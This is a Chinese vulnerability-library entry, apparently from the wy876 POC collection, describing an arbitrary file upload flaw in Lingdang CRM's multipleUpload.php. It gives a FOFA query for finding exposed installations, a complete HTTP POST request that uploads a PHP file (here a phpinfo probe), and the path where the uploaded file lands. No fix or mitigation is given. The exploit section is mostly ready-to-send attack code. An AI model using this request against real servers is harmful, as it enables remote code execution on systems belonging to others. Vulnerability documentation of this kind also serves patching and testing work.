---
fofa: "body="
source: "wy876 漏洞文库"
---

# 灵当crm multipleUpload存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">灵当CRM（Customer Relationship Management，客户关系管理）是一款面向中小企业的客户关系管理软件，旨在帮助企业更好地管理客户信息、销售流程、市场营销和服务支持等方面的工作。灵当CRM提供了一系列工具和功能，帮助企业在销售、市场和服务部门之间实现高效协作，提高客户满意度和业务效率。灵当crm multipleUpload.php处存在任意文件上传漏洞。</font>

# 二、影响版本
+ 灵当crm

# 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"`
+ 特征


# 四、漏洞复现
```java
POST /crm/modules/Home/multipleUpload.php?uploadtype=uploadimg HTTP/1.1
Host: 
Content-Length: 779
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36

------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="file"; filename="budong.php"
Content-Type: text/plain

<?phpinfo();?>
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="error"

UPLOAD_ERR_OK
------WebKitFormBoundary0Mh3BfgWszxRFokh--
```


上传路径

```java
crm/storage/2024/September/week3/budong.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nlhbtvcu71urmozp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
